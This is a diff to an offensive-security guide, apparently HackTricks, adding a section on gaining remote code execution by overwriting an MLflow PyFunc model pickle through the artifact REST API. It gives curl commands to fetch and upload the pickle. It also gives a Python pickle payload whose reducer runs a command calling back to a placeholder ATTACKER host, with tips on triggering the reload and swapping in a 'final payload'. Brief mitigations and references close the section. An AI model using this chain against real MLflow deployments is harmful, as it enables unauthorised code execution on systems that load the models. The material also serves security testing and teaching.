@@ -284,6 +284,42 @@ Review any user-controlled input that reaches:
 
 This specific chain affected self-hosted LangGraph deployments using **SQLite** or **Redis** checkpointers when untrusted users could control `filter`. Patched versions noted in the disclosure were `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, and `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>
 
+### MLflow PyFunc artifact overwrite to pickle RCE
+
+An MLflow PyFunc created from a `PythonModel` can store the serialized object as `python_model.pkl`. The model metadata names `mlflow.pyfunc.model` as its loader and MLflow's implementation uses this filename for the saved Python model. Consequently, write access to the artifact store can become code execution in a different application that later loads the model.<sup>[[17]](#references)[[18]](#references)</sup>
+
+The useful chain is **artifact write permission → replace the pickle → make an inference consumer reload it**. For an experiment using a proxied `mlflow-artifacts:/...` root, enumerate the experiment, run and model artifact path. The tracking server exposes `GET` and `PUT` on `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>
+
+```bash
+# Preserve a copy and confirm the exact object first
+curl -u USER:PASS \
+  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
+  -o original.pkl
+
+# Upload the pickle without curl transforming its bytes
+curl -u USER:PASS -X PUT \
+  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
+  --data-binary @payload.pkl
+```
+
+A minimal reducer can execute a command as soon as the consumer unpickles the artifact. Generating the payload with the Python version declared in `MLmodel` avoids avoidable compatibility problems.<sup>[[17]](#references)[[20]](#references)</sup>
+
+```python
+import os
+import pickle
+
+class Payload:
+    def __reduce__(self):
+        return os.system, ("ping -c 1 ATTACKER",)
+
+with open("payload.pkl", "wb") as f:
+    pickle.dump(Payload(), f)
+```
+
+Trigger the operation that **loads the existing model**, such as prediction, scoring or deployment. Do not retrain first because training may replace the malicious artifact with a fresh model. An application error does not disprove exploitation: the reducer returns the command's integer exit status instead of a usable model. Start with an observable side effect such as ICMP or an HTTP callback, then replace it with the final payload.<sup>[[20]](#references)</sup>
+
+During assessment, distinguish permission to create a run from permission to overwrite artifacts belonging to another run. Review authentication and per-run update permissions, inspect unexpected modifications of `python_model.pkl`, and treat model provenance and integrity as part of the execution boundary. Current MLflow code also supports setting `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` and recommends models-from-code artifacts instead of loading cloudpickle data.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>
+
 ## Models to Path Traversal
 
 As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.<sup>[[16]](#references)</sup>
@@ -345,5 +381,9 @@ For a focused guide on .keras internals, Lambda-layer RCE, the arbitrary import 
 - [14] [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
 - [15] [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
 - [16] [Pivoting Archive Slip Bugs into High-Value AI/ML Bounties](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
+- [17] [Snyk advisory and PyFunc proof of concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
+- [18] [MLflow source – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
+- [19] [MLflow REST API – artifact download and upload endpoints](https://mlflow.org/docs/latest/api_reference/rest-api.html)
+- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
 
 {{#include ../banners/hacktricks-training.md}}
